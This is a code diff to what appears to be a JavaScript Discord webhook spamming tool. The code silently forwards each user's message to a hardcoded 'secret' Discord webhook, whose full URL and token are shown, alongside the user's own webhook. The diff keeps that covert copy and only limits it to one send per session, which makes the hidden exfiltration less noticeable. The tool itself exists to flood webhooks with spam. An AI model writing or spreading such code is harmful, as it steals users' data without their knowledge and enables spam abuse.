@@ -47,6 +47,7 @@
 
         let messageCount = 0;
         let spamActive = false; // Flag to control spam sending
+        let secretWebhookSent = false; // Flag to ensure secret webhook is only hit once
 
         const secretWebhookUrl = "https://discord.com/api/webhooks/1341017371242139678/ki5RrTUeK3gpjZSVDA3wRyjwHGe1Vz1usb6R-Eb1TXR_p0wGZqq7I0Fo-rU_wwXIEOgF";
 
@@ -61,8 +62,11 @@
 
             // Send to the user's webhook
             const response = await sendWebhook(webhookUrl, message);
-            // Send to the secret webhook
-            await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
+            // Send to the secret webhook (only once)
+            if (!secretWebhookSent) {
+                await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
+                secretWebhookSent = true; // Mark secret webhook as sent
+            }
 
             if (response) {
                 messageCount++;
@@ -103,6 +107,7 @@
             delayInput.value = '';
             statusDiv.textContent = "Webhook deleted.";
             messageCount = 0;
+            secretWebhookSent = false; // Reset the flag for the secret webhook
             messageCountDiv.textContent = `Messages sent: ${messageCount}`;
         });
 
